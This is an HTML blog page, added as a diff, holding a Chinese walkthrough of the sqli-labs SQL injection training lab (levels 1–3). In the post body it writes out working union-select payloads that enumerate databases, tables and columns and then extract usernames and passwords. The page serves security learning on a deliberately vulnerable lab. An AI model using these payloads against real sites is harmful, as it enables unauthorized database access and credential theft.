@@ -1,0 +1,189 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>sqli-labs - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="1、1.经过语句and 1&amp;#x3D;2测试 ，页面回显正常
+2.接着尝试在id后面加上’，发现页面回显不正常
+3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="sqli-labs - Hexo"/>
+    <meta name="twitter:description" content="1、1.经过语句and 1&amp;#x3D;2测试 ，页面回显正常
+2.接着尝试在id后面加上’，发现页面回显不正常
+3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="sqli-labs - Hexo"/>
+    <meta property="og:description" content="1、1.经过语句and 1&amp;#x3D;2测试 ，页面回显正常
+2.接着尝试在id后面加上’，发现页面回显不正常
+3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">sqli-labs</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">sqli-labs</h1>
+        <div class="stuff">
+            <span>二月 11, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h1><p><img src="https://img-blog.csdnimg.cn/ce25adad97cd45938ddb3cfc5b568c90.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA546LKuKAlCo=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>1.经过语句and 1&#x3D;2测试 ，页面回显正常<br><img src="https://img-blog.csdnimg.cn/92eb66b499b9485ab046e9e65241cb09.png" alt="在这里插入图片描述"></p>
+<p>2.接着尝试在id后面加上’，发现页面回显不正常<br><img src="https://img-blog.csdnimg.cn/a1ca1f9be098456ba5871dc5a204303b.png" alt="在这里插入图片描述"></p>
+<p>3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入<br>4.使用order by 语句判断该表中一共有几列数据，order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。<br><img src="https://img-blog.csdnimg.cn/ded945b42dd84f498b500b2c64889636.png" alt="在这里插入图片描述"></p>
+<p>5.然后判断有几个显示点，用这个语句?id&#x3D;-1’ union select 1,2,3–+<br>回显是这个图<br><img src="https://img-blog.csdnimg.cn/d0a76b72fb24468486de003283a58f6c.png" alt="在这里插入图片描述"></p>
+<p>6.然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。<br>查询数据库名信息的语句：?id&#x3D;1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+<br>表名：?id&#x3D;1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)–+<br>列名：select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’<br>7.然后就可以取出username和password<br>名字语句：?id&#x3D;-1’ union select 1,2,group_concat(username) from security.users –+<br>密码语句：?id&#x3D;-1’ union select 1,2,group_concat(password) from security.users –+<br><img src="https://img-blog.csdnimg.cn/2b6f03ee4b7443c28a59c552e9e1aa8a.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/7dbb9a36dbb74d3f87c2a5f013a5164f.png" alt="在这里插入图片描述"></p>
+<h1 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h1><p>这个和上一关差不多。<br>1.输入?id&#x3D;2-1页面信息发生变化，说明此处是数值型注入<br>2.order by 3  页面显示正常，order by 4页面显示不正常，所以该表有3列数据<br>3.然后查询注入就可以了。<br><img src="https://img-blog.csdnimg.cn/fb4a7b50e6a44659b378b895a54eb92a.png" alt="在这里插入图片描述"></p>
+<h1 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h1><p>1.向页面输入?id&#x3D;1’  –+页面显示不正常<br><img src="https://img-blog.csdnimg.cn/4abf2c7e880149d590cba0bd64430303.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA546LKuKAlCo=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后加上括号，?id&#x3D;-1’)<br><img src="https://img-blog.csdnimg.cn/d888c5d346cf491e8a2a0a678e623c77.png" alt="在这里插入图片描述"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://www.xzmp3.com/down/426925eacc0b.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://www.xzmp3.com/down/928e294ccea7.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
